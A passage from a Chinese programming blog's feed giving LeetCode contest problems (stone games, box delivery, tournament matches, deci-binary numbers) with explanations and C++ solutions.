class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：aliceValues = [<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>], bobValues = [<span class="number">1</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line">输出：<span class="number">-1</span></span><br><span class="line">解释：</span><br><span class="line">不管 Alice 怎么操作，Bob 都可以得到比 Alice 更高的得分。</span><br><span class="line">比方说，Alice 拿石子 <span class="number">1</span> ，Bob 拿石子 <span class="number">2</span> ， Alice 拿石子 <span class="number">0</span> ，Alice 会得到 <span class="number">6</span> 分而 Bob 得分为 <span class="number">7</span> 分。</span><br><span class="line">Bob 会获胜。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>n == aliceValues.length == bobValues.length</code></li><li><code>1 &lt;= n &lt;= 105</code></li><li><code>1 &lt;= aliceValues[i], bobValues[i] &lt;= 100</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/stone-game-vi" target="_blank" rel="noopener">https://leetcode-cn.com/problems/stone-game-vi</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 贪心算法</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>首先我们看题目的数据量即可知道，必然只有一种的选取的策略一定是最优的,首先我们假如所有的石子的得分都是相同的，则肯定是先手的赢。</li><li>我们假设<code>alice</code>取得最优策略石子的索引数组为：<script type="math/tex; mode=display">(a[0],a[1],a[2],...,a[n/2])</script>则我们可以知道<code>alice</code>的得分为$scorea = \sum_{i=0}^{n/2}aliceValue[a[i]]$;<br>而同时$bob$的得分为：<br>$scoreb = sum(bobValues) - \sum_{i=0}^{n/2}bobValue[a[i]]$.则两者的差为：<script type="math/tex; mode=display">scorea - scoreb = \sum_{i=0}^{n/2}(aliceValue[a[i]] + bobValue[a[i]]) - sum(bobValues)</script>最优策略即为我们应当使得先手时，$scorea - scoreb$的差值尽可能的大，因此我们应该尽量选择$(aliceValue[a[i]] + bobValue[a[i]])$尽可能大得元素。因此我们按照二者得分之和的大小进行排序即可，依次取即可。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">stoneGameVI</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; aliceValues, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; bobValues)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = aliceValues.size();</span><br><span class="line">        <span class="keyword">int</span> sa = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sb = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;pii&gt; arr;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            arr.push_back(&#123;aliceValues[i] + bobValues[i],i&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        sort(arr.begin(),arr.end(),[](<span class="keyword">const</span> pii &amp; a,<span class="keyword">const</span> pii &amp; b)&#123;</span><br><span class="line">            <span class="keyword">return</span> a.first &gt; b.first;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span> == <span class="number">0</span>) sa += aliceValues[arr[i].second];</span><br><span class="line">            <span class="keyword">else</span> sb += bobValues[arr[i].second];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sa &gt; sb) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sa &lt; sb) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title=" "></a> </h2><h3 id="题目-5612-从仓库到码头运输箱子"><a href="#题目-5612-从仓库到码头运输箱子" class="headerlink" title="题目 5612. 从仓库到码头运输箱子"></a>题目 5612. 从仓库到码头运输箱子</h3><p>你有一辆货运卡车，你需要用这一辆车把一些箱子从仓库运送到码头。这辆卡车每次运输有 箱子数目的限制 和 总重量的限制 。</p><p>给你一个箱子数组 boxes 和三个整数 <code>portsCount</code>, <code>maxBoxes</code> 和 <code>maxWeight</code> ，其中 <code>boxes[i] = [ports​​i​, weighti]</code> 。</p><ul><li><code>ports​​i</code> 表示第 i 个箱子需要送达的码头， <code>weightsi</code> 是第 i 个箱子的重量。</li><li><code>portsCount</code> 是码头的数目。</li><li><code>maxBoxes</code> 和 <code>maxWeight</code> 分别是卡车每趟运输箱子数目和重量的限制。</li><li>箱子需要按照 数组顺序 运输，同时每次运输需要遵循以下步骤：</li></ul><p>卡车从 boxes 队列中按顺序取出若干个箱子，但不能违反 maxBoxes 和 maxWeight 限制。</p><ul><li>对于在卡车上的箱子，我们需要 按顺序 处理它们，卡车会通过 一趟行程 将最前面的箱子送到目的地码头并卸货。如果+ 卡车已经在对应的码头，那么不需要 额外行程 ，箱子也会立马被卸货。</li><li>卡车上所有箱子都被卸货后，卡车需要 一趟行程 回到仓库，从箱子队列里再取出一些箱子。</li><li>卡车在将所有箱子运输并卸货后，最后必须回到仓库。</li></ul><p>请你返回将所有箱子送到相应码头的 最少行程 次数。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：boxes = [[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">2</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">1</span>]], portsCount = <span class="number">2</span>, maxBoxes = <span class="number">3</span>, maxWeight = <span class="number">3</span></span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">解释：最优策略如下：</span><br><span class="line">- 卡车将所有箱子装上车，到达码头 <span class="number">1</span> ，然后去码头 <span class="number">2</span> ，然后再回到码头 <span class="number">1</span> ，最后回到仓库，总共需要 <span class="number">4</span> 趟行程。</span><br><span class="line">所以总行程数为 <span class="number">4</span> 。</span><br><span class="line">注意到第一个和第三个箱子不能同时被卸货，因为箱子需要按顺序处理（也就是第二个箱子需要先被送到码头 <span class="number">2</span> ，然后才能处理第三个箱子）。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：boxes = [[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">3</span>],[<span class="number">3</span>,<span class="number">1</span>],[<span class="number">3</span>,<span class="number">1</span>],[<span class="number">2</span>,<span class="number">4</span>]], portsCount = <span class="number">3</span>, maxBoxes = <span class="number">3</span>, maxWeight = <span class="number">6</span></span><br><span class="line">输出：<span class="number">6</span></span><br><span class="line">解释：最优策略如下：</span><br><span class="line">- 卡车首先运输第一个箱子，到达码头 <span class="number">1</span> ，然后回到仓库，总共 <span class="number">2</span> 趟行程。</span><br><span class="line">- 卡车运输第二、第三、第四个箱子，到达码头 <span class="number">3</span> ，然后回到仓库，总共 <span class="number">2</span> 趟行程。</span><br><span class="line">- 卡车运输第五个箱子，到达码头 <span class="number">3</span> ，回到仓库，总共 <span class="number">2</span> 趟行程。</span><br><span class="line">总行程数为 <span class="number">2</span> + <span class="number">2</span> + <span class="number">2</span> = <span class="number">6</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：boxes = [[<span class="number">1</span>,<span class="number">4</span>],[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">2</span>,<span class="number">1</span>],[<span class="number">2</span>,<span class="number">1</span>],[<span class="number">3</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]], portsCount = <span class="number">3</span>, maxBoxes = <span class="number">6</span>, maxWeight = <span class="number">7</span></span><br><span class="line">输出：<span class="number">6</span></span><br><span class="line">解释：最优策略如下：</span><br><span class="line">- 卡车运输第一和第二个箱子，到达码头 <span class="number">1</span> ，然后回到仓库，总共 <span class="number">2</span> 趟行程。</span><br><span class="line">- 卡车运输第三和第四个箱子，到达码头 <span class="number">2</span> ，然后回到仓库，总共 <span class="number">2</span> 趟行程。</span><br><span class="line">- 卡车运输第五和第六个箱子，到达码头 <span class="number">3</span> ，然后回到仓库，总共 <span class="number">2</span> 趟行程。</span><br><span class="line">总行程数为 <span class="number">2</span> + <span class="number">2</span> + <span class="number">2</span> = <span class="number">6</span> 。</span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：boxes = [[<span class="number">2</span>,<span class="number">4</span>],[<span class="number">2</span>,<span class="number">5</span>],[<span class="number">3</span>,<span class="number">1</span>],[<span class="number">3</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">7</span>],[<span class="number">3</span>,<span class="number">1</span>],[<span class="number">4</span>,<span class="number">4</span>],[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">5</span>,<span class="number">2</span>]], portsCount = <span class="number">5</span>, maxBoxes = <span class="number">5</span>, maxWeight = <span class="number">7</span></span><br><span class="line">输出：<span class="number">14</span></span><br><span class="line">解释：最优策略如下：</span><br><span class="line">- 卡车运输第一个箱子，到达码头 <span class="number">2</span> ，然后回到仓库，总共 <span class="number">2</span> 趟行程。</span><br><span class="line">- 卡车运输第二个箱子，到达码头 <span class="number">2</span> ，然后回到仓库，总共 <span class="number">2</span> 趟行程。</span><br><span class="line">- 卡车运输第三和第四个箱子，到达码头 <span class="number">3</span> ，然后回到仓库，总共 <span class="number">2</span> 趟行程。</span><br><span class="line">- 卡车运输第五个箱子，到达码头 <span class="number">3</span> ，然后回到仓库，总共 <span class="number">2</span> 趟行程。</span><br><span class="line">- 卡车运输第六和第七个箱子，到达码头 <span class="number">3</span> ，然后去码头 <span class="number">4</span> ，然后回到仓库，总共 <span class="number">3</span> 趟行程。</span><br><span class="line">- 卡车运输第八和第九个箱子，到达码头 <span class="number">1</span> ，然后去码头 <span class="number">5</span> ，然后回到仓库，总共 <span class="number">3</span> 趟行程。</span><br><span class="line">总行程数为 <span class="number">2</span> + <span class="number">2</span> + <span class="number">2</span> + <span class="number">2</span> + <span class="number">3</span> + <span class="number">3</span> = <span class="number">14</span> 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= boxes.length &lt;= 105</code></li><li><code>1 &lt;= portsCount, maxBoxes, maxWeight &lt;= 105</code></li><li><code>1 &lt;= ports​​i &lt;= portsCount</code></li><li><code>1 &lt;= weightsi &lt;= maxWeight</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/delivering-boxes-from-storage-to-ports" target="_blank" rel="noopener">https://leetcode-cn.com/problems/delivering-boxes-from-storage-to-ports</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> dp</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>二维的<code>dp</code>非常容易实现，但是难点在于如何将二维的<code>dp</code>简化为一维的<code>dp</code>这点不太容易实现。</li><li>我们设<code>dp[i]</code>表示前<code>i</code>个箱子的最小代价，则我们知道递推公式如下：<script type="math/tex; mode=display">dp[i] = min{dp[j] + diff(j+1,i) + 2} \\(i - j \le maxBoxes \And \sum_{k=j+1}^{i} w[k] \le maxWeight)</script></li><li>看到题目中非常前秒的解答，即将<code>dp[i]</code>进行再变换：<script type="math/tex; mode=display">dp[i] = min{dp[j] + diff(j+1,i) + 2} \\= min{dp[j] + diff[i] - diff[j+1] + 2} \\= min{dp[j] - diff[j+1]} + diff[i]  + 2 \\</script>变换成上述表达式，则我们就每次直接选区$dp[j] - diff[j+1]$,我们保存前<code>i-1</code>项的上述值，可以利用优先级队列，每次选出最小的$dp[j] - diff[j+1]$即可，且同时满足<code>maxBoxes，maxWeight</code>要求即可。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">boxDelivering</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; boxes, <span class="keyword">int</span> portsCount, <span class="keyword">int</span> maxBoxes, <span class="keyword">int</span> maxWeight)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = boxes.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; wsum(n+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; diff(n+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dp(n+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; g(n+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">deque</span>&lt;<span class="keyword">int</span>&gt; qu;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">            wsum[i] = wsum[i<span class="number">-1</span>] + boxes[i<span class="number">-1</span>][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">1</span> &amp;&amp; boxes[i<span class="number">-1</span>][<span class="number">0</span>] != boxes[i<span class="number">-2</span>][<span class="number">0</span>])&#123;</span><br><span class="line">                diff[i] = diff[i<span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                diff[i] = diff[i<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        qu.push_back(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!qu.empty()&amp;&amp;(wsum[i]-wsum[qu.front()] &gt; maxWeight || i - qu.front() &gt; maxBoxes))&#123;</span><br><span class="line">                qu.pop_front();</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i] = g[qu.front()] + diff[i] + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(i &lt; n)&#123;</span><br><span class="line">                g[i] = dp[i] - diff[i+<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">while</span>(!qu.empty() &amp;&amp; g[i] &lt;= g[qu.back()])&#123;</span><br><span class="line">                    qu.pop_back();</span><br><span class="line">                &#125;</span><br><span class="line">                qu.push_back(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="-1"><a href="#-1" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-biwee-contest-41&quot;&gt;&lt;a href=&quot;#leetcode-biwee-contest-41&quot; class=&quot;headerlink&quot; title=&quot;leetcode  biwee contest 41&quot;&gt;&lt;/a&gt;leetcode  biwee contest 41&lt;/h1&gt;&lt;p&gt;双周赛的题目果然难度很高，真心很难。&lt;/p&gt;&lt;h2 id=&quot;5609-统计一致字符串的数目&quot;&gt;&lt;a href=&quot;#5609-统计一致字符串的数目&quot; class=&quot;headerlink&quot; title=&quot;5609. 统计一致字符串的数目&quot;&gt;&lt;/a&gt;5609. 统计一致字符串的数目&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你一个由不同字符组成的字符串 &lt;code&gt;allowed&lt;/code&gt;和一个字符串数组 &lt;code&gt;words&lt;/code&gt; 。如果一个字符串的每一个字符都在 &lt;code&gt;allowed&lt;/code&gt;中，就称这个字符串是 一致 字符串。&lt;/p&gt;&lt;p&gt;请你返回 &lt;code&gt;words&lt;/code&gt; 数组中 一致 字符串的数目。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  周赛 219场</title>
    <link href="http://yoursite.com/2020/12/13/234/"/>
    <id>http://yoursite.com/2020/12/13/234/</id>
    <published>2020-12-13T05:04:29.318Z</published>
    <updated>2020-12-13T07:04:25.064Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-219"><a href="#leetcode-contest-219" class="headerlink" title="leetcode   contest 219"></a>leetcode   contest 219</h1><p>本周的周赛题目还算比较简单，但是双周赛的题目真心好难，基本上达到初级的竞赛程度。</p><h2 id="5625-比赛中的配对次数"><a href="#5625-比赛中的配对次数" class="headerlink" title="5625. 比赛中的配对次数"></a>5625. 比赛中的配对次数</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数 n ，表示比赛中的队伍数。比赛遵循一种独特的赛制：</p><p>如果当前队伍数是 偶数 ，那么每支队伍都会与另一支队伍配对。总共进行 <code>n / 2</code> 场比赛，且产生<code>n / 2</code> 支队伍进入下一轮。<br>如果当前队伍数为 奇数 ，那么将会随机轮空并晋级一支队伍，其余的队伍配对。总共进行 <code>(n - 1) / 2</code>场比赛，且产生 <code>(n - 1) / 2 + 1</code> 支队伍进入下一轮。<br>返回在比赛中进行的配对次数，直到决出获胜队伍为止。</p><a id="more"></a><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">7</span></span><br><span class="line">输出：<span class="number">6</span></span><br><span class="line">解释：比赛详情：</span><br><span class="line">- 第 <span class="number">1</span> 轮：队伍数 = <span class="number">7</span> ，配对次数 = <span class="number">3</span> ，<span class="number">4</span> 支队伍晋级。</span><br><span class="line">- 第 <span class="number">2</span> 轮：队伍数 = <span class="number">4</span> ，配对次数 = <span class="number">2</span> ，<span class="number">2</span> 支队伍晋级。</span><br><span class="line">- 第 <span class="number">3</span> 轮：队伍数 = <span class="number">2</span> ，配对次数 = <span class="number">1</span> ，决出 <span class="number">1</span> 支获胜队伍。</span><br><span class="line">总配对次数 = <span class="number">3</span> + <span class="number">2</span> + <span class="number">1</span> = <span class="number">6</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">14</span></span><br><span class="line">输出：<span class="number">13</span></span><br><span class="line">解释：比赛详情：</span><br><span class="line">- 第 <span class="number">1</span> 轮：队伍数 = <span class="number">14</span> ，配对次数 = <span class="number">7</span> ，<span class="number">7</span> 支队伍晋级。</span><br><span class="line">- 第 <span class="number">2</span> 轮：队伍数 = <span class="number">7</span> ，配对次数 = <span class="number">3</span> ，<span class="number">4</span> 支队伍晋级。 </span><br><span class="line">- 第 <span class="number">3</span> 轮：队伍数 = <span class="number">4</span> ，配对次数 = <span class="number">2</span> ，<span class="number">2</span> 支队伍晋级。</span><br><span class="line">- 第 <span class="number">4</span> 轮：队伍数 = <span class="number">2</span> ，配对次数 = <span class="number">1</span> ，决出 <span class="number">1</span> 支获胜队伍。</span><br><span class="line">总配对次数 = <span class="number">7</span> + <span class="number">3</span> + <span class="number">2</span> + <span class="number">1</span> = <span class="number">13</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= n &lt;= 200</code></li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/count-of-matches-in-tournament" target="_blank" rel="noopener">https://leetcode-cn.com/problems/count-of-matches-in-tournament</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  递归或者非递归即可</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>简单的根据题意即可。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numberOfMatches</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span> == <span class="number">0</span>) <span class="keyword">return</span> n/<span class="number">2</span> + numberOfMatches(n/<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> (n+<span class="number">1</span>)/<span class="number">2</span> + numberOfMatches((n<span class="number">-1</span>)/<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5626-十-二进制数的最少数目"><a href="#5626-十-二进制数的最少数目" class="headerlink" title="5626. 十-二进制数的最少数目"></a>5626. 十-二进制数的最少数目</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>如果一个十进制数字不含任何前导零，且每一位上的数字不是 0 就是 1 ，那么该数字就是一个 十-二进制数 。例如，<code>101</code>和 <code>1100</code>都是 十-二进制数，而<code>112</code> 和 <code>3001</code>不是。</p><p>给你一个表示十进制整数的字符串 <code>n</code> ，返回和为 <code>n</code> 的 十-二进制数 的最少数目。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="string">"32"</span></span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：<span class="number">10</span> + <span class="number">11</span> + <span class="number">11</span> = <span class="number">32</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="built_in">n</span> = <span class="string">"82734"</span></span><br><span class="line">输出：<span class="number">8</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="built_in">n</span> = <span class="string">"27346209830709182346"</span></span><br><span class="line">输出：<span class="number">9</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= n.length &lt;= 105</code></li><li><code>n</code> 仅由数字组成</li><li><code>n</code>不含任何前导零并总是表示正整数</li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/partitioning-into-minimum-number-of-deci-binary-numbers" target="_blank" rel="noopener">https://leetcode-cn.com/problems/partitioning-into-minimum-number-of-deci-binary-numbers</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 数学</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>仔细分析一下，即可知道每位均由<code>1</code>组成，所以最少只需要每位的最大值即可，我们可以知道根据数学即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3></li></ol><ul><li>单调栈<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minPartitions</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : s)&#123;</span><br><span class="line">            ans = max(ans,c - <span class="string">'0'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5627-石子游戏-VII"><a href="#5627-石子游戏-VII" class="headerlink" title="5627. 石子游戏 VII"></a>5627. 石子游戏 VII</h2><p>石子游戏中，爱丽丝和鲍勃轮流进行自己的回合，爱丽丝先开始 。</p><p>有<code>n</code> 块石子排成一排。每个玩家的回合中，可以从行中 移除 最左边的石头或最右边的石头，并获得与该行中剩余石头值之 和 相等的得分。当没有石头可移除时，得分较高者获胜。</p><p>鲍勃发现他总是输掉游戏（可怜的鲍勃，他总是输），所以他决定尽力 减小得分的差值 。爱丽丝的目标是最大限度地 扩大得分的差值 。</p><p>给你一个整数数组 <code>stones</code>，其中 <code>stones[i]</code>表示 从左边开始 的第 <code>i</code>个石头的值，如果爱丽丝和鲍勃都 发挥出最佳水平 ，请返回他们 得分的差值 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 